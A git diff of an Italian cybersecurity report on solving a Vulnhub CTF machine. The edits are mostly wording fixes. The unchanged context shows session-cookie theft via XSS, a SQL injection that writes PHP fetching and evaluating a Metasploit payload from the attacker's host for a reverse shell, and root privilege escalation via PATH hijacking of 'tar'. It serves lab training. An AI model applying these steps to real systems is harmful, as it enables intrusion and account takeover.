@@ -1,10 +1,12 @@
 # Report Cybersecurity
+</br>
 
 ## Introduzione
 
+
 La demo consiste nella risoluzione di una challenge Catch The Flag (CTF) di [Vulnhub](https://www.vulnhub.com/entry/credit-card-scammers-1,479/).
 
-L'obiettivo è quello di ottenere privilegi root su una macchina virtuale Linux preconfigurata, cercando 3 flag durante il percorso. Lo scenario è quello di una rete popolata da sole due macchine, quella attaccante (Kali Linux) e quella obiettivo. L'attaccante può comunicare direttamente con l'obiettivo e ha a disposizione software utili per sfruttarne le vulnerabilita.
+L'obiettivo è quello di ottenere privilegi root su una macchina virtuale Linux preconfigurata, cercando 3 flag durante il percorso. Lo scenario è quello di una rete popolata da sole due macchine, quella attaccante (Kali Linux) e quella obiettivo. L'attaccante può comunicare direttamente con l'obiettivo e ha a disposizione software utili per sfruttarne le vulnerabilità.
 
 NOTA: La risoluzione è stata condotta seguento il [writeup](https://www.bootlesshacker.com/credit-card-scammers-ctf-walkthrough/)  creato dall'autore della macchina virtuale. In alcuni punti, l'esecuzione è stata condotta seguendo un ordine leggermente diverso.
 Per la comprensione di comandi e script usati sono state consultate diverse risorse online, tra cui anche ChatGPT. 
@@ -13,20 +15,24 @@ I principali passi per la risoluzione consistono in:
 
 - Ricognizione rete ed enumerazione servizi
 - Session hijacking tramite XSS injection
-- Ottenimento reverse shell
+- Ottenimento reverse shell con meterpreter
 - Privilege escalation
+
+</br>
 
 
 ## Ricognizione ed enumerazione
 
-Per prima cosa è necessario scansionare rete in modo da identificare l'indirizzo ip della macchina obiettivo. Tra i vari software disponibili, è stato scelto di utilizzare *nmap*, tramite cui, con opzioni appropriate, e possibile rilvare direttamente anche i servizi disponibili sui nodi trovati.
+Per prima cosa è necessario scansionare rete in modo da identificare l'indirizzo ip della macchina obiettivo. Tra i vari software disponibili, è stato scelto di utilizzare *nmap*, tramite cui, con opzioni appropriate, è possibile rilvare direttamente anche i servizi disponibili sui nodi trovati.
 <p align="center">
 <img src="images/nmap2.png" width=80%/>
 </p>
 
 La porta 80 della macchina obiettivo risulta aperta per un web server. È possibile visitare il sito web ospitato, che risulta essere adibito alla vendita di prodotti medici. 
 
-## XSS injection e session hijacking
+</br>
+
+## Session hijacking
 
 Sul sito, selezionando uno dei prodotti sul catalogo, è possibile compilare dei form per effettuarne l'ordine. Tali form potrebbero essere vulnerabili ad attacchi di tipo Cross-Site Scripting (XSS), che di solito consistono nell'injection di codice tramite input da webapp il cui contenuto non viene opportunamente validato o sanato: il codice malevolo viene inviato a un utente lato server, che lo mette ignaramente in esecuzione.
 
@@ -52,7 +58,7 @@ python -m http.server 80
 
 Poco dopo l'injection, dal log del server è visibile la richiesta per l'immagine dello script, in cui è esposto il cookie di sessione dell'amministratore. 
 
-Si può notare che questa injection è categorizzabile come remota, senza autenticazione ma che richiede necessariamente un'azione da parte di un utente per la realizzazione effettiva.
+Si può notare che questa injection è categorizzabile come remota, senza autenticazione ma che richiede necessariamente un'azione da parte di un utente lato webserver per la realizzazione effettiva.
 
 <p align="center">
 <img src="images/cookie1.png" width=80%/>
@@ -68,9 +74,11 @@ Non essendo in possesso di credenziali, si può impersonare l'amministratore del
 <img src="images/burp1.png" width=70%/>
 </p>
 
+</br>
+
 ## Reverse shell
 
-Valorizzando opportunamente il campo ```Cookie``` e inoltrando la richiesta, si accede al pannello amministrativo, in cui sono visibili gli ordini di altri clienti. In un submenu è presente un link denominato ```database admin```, che porta a una pagina interattiva tramite cui interagire con il database del negozio. Il form permette solamente di inserire o rimuovere dati, non di interrogare il database. È importante notare che l'interazione con il database è diretta, non mediata da prepared statement e stored procedures, il che rende il webserver vulnerabile a SQL injection.
+Valorizzando opportunamente il campo ```Cookie``` e inoltrando la richiesta, si accede al pannello amministrativo, in cui sono visibili gli ordini di altri clienti. In un submenu è presente un link denominato ```database admin```, che porta a una pagina interattiva tramite cui interagire con il database del negozio. Il form permette solamente di inserire o rimuovere dati, non di interrogare il database. È importante notare che l'interazione con il database è diretta, non mediata da prepared statement e stored procedures, il che rende il webserver potenzialmente vulnerabile a SQL injection.
 
 In SQL è possibile scrivere l'output di una query in un file specificato: ammesso che l'utente del database abbia i privilegi necessari, è possibile farlo anche all'interno del webserver. Si può dunque tentare di effettuare injection di codice tramite la query SQL. La query test, con payload php, è la seguente:
 
@@ -97,7 +105,7 @@ sudo msfconsole
    run
 ```
 
-dove LHOST e LPORT sono rispettivamente indirizzo ip e porta su cui sta in ascolto la macchina attaccante, SRVPORT invece è la porta usata dal server Metasploit per servire il payload meterpreter. Le porte usate sono quelle più comuni, in modo da evitare l'interferenza di firewall.
+dove ```LHOST``` e ```LPORT``` sono rispettivamente indirizzo ip e porta su cui sta in ascolto la macchina attaccante, ```SRVPORT``` invece è la porta usata dal server Metasploit per servire il payload meterpreter. Le porte usate sono quelle più comuni, in modo da evitare l'interferenza di firewall.
 
 Il payload generato è il seguente:
 
@@ -112,7 +120,7 @@ SELECT "<?php eval(file_get_contents('http://192.168.56.1:443/QDtxspMboNPbjD', f
 ```
 
 
-La funzione ```eval()``` valorizza la stringa in argomento come codice php. In questo caso, ad essere valorizzato è il contenuto del file ottenuto e convertito in stringa tramite la funzione ```file_get_contents()```.  La funzione ha come argomento un URL, il cui host è la macchina attaccante; il file specificato viene servito da metasploit e contiene il codice malevolo per la creazione della reverse shell. Le opzioni aggiuntive servono per disattivare la verifica del certificato SSL.
+La funzione ```eval()``` valorizza la stringa in argomento come codice php. In questo caso, ad essere valorizzato è il contenuto del file ottenuto e convertito in stringa tramite la funzione ```file_get_contents()```.  Quest'ultima ha come argomento un URL, il cui host è la macchina attaccante; il file specificato viene servito da Metasploit e contiene il codice malevolo per la creazione della reverse shell. Le opzioni aggiuntive servono per disattivare la verifica del certificato SSL.
 
 Il codice iniettato viene scritto su un file nel filesystem del webserver, sul quale entra in esecuzione una volta aperto dall'attaccante tramite browser.
 
@@ -131,13 +139,15 @@ shell
 python2.7 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Meterpreter permetterebbe di interagire con la macchina obiettivo senza generare nuovi processi: lanciare una shell ha come effetto quello di generare un nuovo processo, che in uno scenario reale potrebbe rendere l'attaccante più esposto.
+Meterpreter permetterebbe di interagire con la macchina obiettivo senza generare nuovi processi: lanciare una shell ha come effetto quello di generare un nuovo processo, che in uno scenario reale potrebbe rendere l'attaccante più facilmente rilevabile.
+
+</br>
 
 ## Privilege Escalation
 
 Con il comando ```whoami```, si può vedere che si sta impersonando l'account di nome apache. Inoltre nella directory corrente, ```/var/www/html```, si trova il primo flag. 
 
-Nella stessa directory è presente una cartella settings, contenente il file ```config.php```. Al suo interno ci sono le infomazioni del database per la gestione degli ordini del negozio, denominato ```orders```, tra cui anche la password in chiaro per accedervi. 
+Nella stessa directory è presente una directory ```settings```, contenente il file ```config.php```. Al suo interno ci sono le infomazioni del database per la gestione degli ordini del negozio, denominato ```orders```, tra cui anche la password in chiaro per accedervi. 
 
 <p align="center">
 <img src="images/config.png" width=30%/>
@@ -173,7 +183,7 @@ sleep 30
 
 Lo script non è modficabile dall'account attuale. Al suo interno però viene chiamato il comando ```tar```, che serve per la compressione/decompressione di file. È importante notare che il comando viene chiamato direttamente, senza che sia specificato il path dell'eseguibile. In Linux, se il path di un eseguibile non è specificato, il sistema operativo cerca il relativo eseguibile tra quelli inseriti nella variabile d'ambiente ```$PATH```, una lista ordinata di directory separate dal carattere ' : '.
 
-Il primo passo chiave è il seguente: aggiungere una entry al contenuto di ```$PATH``` , ovvero una directory che contiene un nuovo esegubile ```tar``` che, anziché eseguire la compressione di un file, generi una shell. È fondamentale che il nuovo path sia inserito al primo posto nella lista, in modo che il sistema operativo lo veda per primo. Si può notare che se il contenuto di ```$PATH``` venisse sovrascritto completamente, gli eseguibili dei comandi Linux usati da terminale non sarebbero più trovati e sarebbe necessario digitare i path completi ogni volta. 
+Il primo passo chiave è il seguente: aggiungere una entry al contenuto di ```$PATH```, ovvero una directory che contiene un nuovo esegubile ```tar``` che, anziché eseguire la compressione di un file, generi una shell. È fondamentale che il nuovo path sia inserito al primo posto nella lista, in modo che il sistema operativo lo veda per primo. Si può notare che se il contenuto di ```$PATH``` venisse sovrascritto completamente, gli eseguibili dei comandi Linux usati da terminale non sarebbero più trovati e sarebbe necessario digitare i path completi ogni volta. 
 
 Il contenuto di ```$PATH``` è sovrascrivibile con il comando seguente:
 
@@ -189,7 +199,7 @@ echo "/bin/bash" > tar
 chmod +x tar
 ```
 
-Per generare una shell con privilegi root, è necessario eseguire ```backup.sh``` con i medesimi privilegi. Non conoscendo la password, servirebbe che su ```backup.sh``` fosse impostato il bit SUID che permetterebbe di lanciare lo script con privilegi di root, in quanto proprietario del file.
+Per generare una shell con privilegi root, è necessario eseguire ```backup.sh``` con i medesimi privilegi. Non conoscendo la password, servirebbe che su ```backup.sh``` fosse impostato il bit SUID, che permetterebbe di lanciare lo script con privilegi di root in quanto proprietario del file.
 
 Si procede dunque trovando tutti gli eseguibili con impostato il bit SUID per poi individuarne uno che chiama lo script ```backup.sh``` e lanciarlo. Il comando per listare gli eseguibili di interesse è il seguente:
 
@@ -203,7 +213,7 @@ Nell'output compare l'eseguibile ```/usr/bin/backup```. Per vederne il contenuto
 <img src="images/strings1.png" width=50%/>
 </p>
 
- Ora basta eseguirlo per ottenere una shell con privilegi root. Accedendo alla directory ```/root``` si ottiene il terzo flag.
+ Ora basta eseguire ```backup``` per ottenere una shell con privilegi root. Accedendo alla directory ```/root``` si ottiene il terzo flag.
 
 <p align="center">
 <img src="images/root1.png" width=50%/>
